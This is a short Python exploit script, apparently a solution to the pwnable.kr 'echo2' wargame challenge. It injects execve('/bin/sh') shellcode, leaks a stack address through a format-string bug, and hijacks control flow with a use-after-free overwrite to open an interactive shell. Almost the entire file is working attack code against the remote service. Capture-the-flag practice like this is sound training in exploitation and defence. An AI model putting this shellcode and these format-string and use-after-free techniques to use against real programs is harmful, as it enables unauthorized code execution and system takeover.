from zio import *
c_read  = COLORED(RAW, 'blue')
c_write = COLORED(RAW, 'green')
target  = './echo2'
target  = ('pwnable.kr', 9011)
io      = zio(target, print_read = c_read, print_write = c_write, timeout = 10000)
#io.gdb_hint([0x400864, 0x400886])
#io.gdb_hint([0x400887])

# https://www.exploit-db.com/exploits/36858/
shellcode = "\x31\xf6\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x56""\x53\x54\x5f\x6a\x3b\x58\x31\xd2\x0f\x05"

io.read_until("hey, what's your name? :")
io.writeline(shellcode)

def fsb(payload):
    io.read_until('> ')
    io.writeline('2')
    io.readline()
    io.writeline(payload)

def uaf(payload):
    io.read_until('> ')
    io.writeline('3')
    io.readline()
    io.writeline(payload)

def freeo():
    io.read_until('> ')
    io.writeline('4')
    io.read_until('Are you sure you want to exit? (y/n)')
    io.writeline('n')

payload0    =   "%10$016lx"
fsb(payload0)

adr_sc      =   int((io.read(16)), 16) - 0x20

freeo()
payload1    =   ''.ljust(0x18, 'A')
payload1    +=  l64(adr_sc)
uaf(payload1)
io.read_until('> ')
io.writeline('3')

io.interact()

